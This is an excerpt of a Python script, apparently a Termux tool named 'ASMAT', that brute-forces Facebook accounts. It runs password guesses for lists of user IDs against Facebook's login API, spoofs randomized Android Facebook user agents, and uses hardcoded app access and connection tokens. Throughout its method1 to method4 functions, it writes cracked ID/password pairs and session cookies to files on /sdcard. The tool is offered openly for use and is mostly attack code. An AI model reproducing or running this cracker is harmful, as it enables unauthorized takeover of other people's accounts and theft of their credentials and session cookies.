...
def logo():
	os.system('clear')
	logo = (f'''\033[1;37m                                 
\033[1;32m .d8b.  .d8888. .88b  d88.  .d8b.  d888888b 
\033[1;32md8' `8b 88'  YP 88'YbdP`88 d8' `8b `~~88~~' 
\033[1;32m88ooo88 `8bo.   88  88  88 88ooo88    88    
\033[1;32m88~~~88   `Y8b. 88  88  88 88~~~88    88    
\033[1;32m88   88 db   8D 88  88  88 88   88    88    
\033[1;32mYP   YP `8888Y' YP  YP  YP YP   YP    YP        
---------------------------------------------------
\033[1;32mTOOL IS FREE BUT PUBLIC ON 500 SUBSCRIBERS
---------------------------------------------------
 [•] \033[1;32mOwner     :  \033[1;32m ASMAT
 [•] Github    :   HAVEELI PE AJANA
 [•] Status    :   FREE
 [•] Tool      :   FREE 
 [•] Facebook  :  \033[1;32m ASMAT
...
class ASMAT:
	...
	def ASMAT(self):
		...
		else:p(" [•] Wrong Select ");sp(2);self.ASMAT()
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ASMAT] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			...
			ASMAT_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBDV/SM-G975U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			#UPDATED
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
...
'X-FB-Server-Cluster': 'True',}
				...
				if "session_key" in q:
					...
					#p('\r\033[1;35m[ASMAT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ASMAT] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			...
			ASMAT_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBDV/8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			#UPDATED
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
...
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
				...
				if "session_key" in q:
					...
					open('/sdcard/ASMAT_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ASMAT_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ASMAT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ASMAT_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ASMAT] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			...
			fban = random.choice(["FB4A", "FB5A", "FB6A"])
			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
			ASMAT_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Oppo;FBBD/Oppo;FBDV/A54;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			#UPDATED
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[ASMAT-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ASMAT_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					#os.system('espeak -a 300 " ASMAT,  Ok,  id"')
					open('/sdcard/ASMAT_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;35m[ASMAT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ASMAT_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ASMAT] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/ASMAT_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ASMAT_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[ASMAT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ASMAT_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
if __name__=="__main__":
	#anary_detect()
	ASMAT().ASMAT()
	#ASMAT().method2('100093614310527','Right123',['55556666'])
Footer
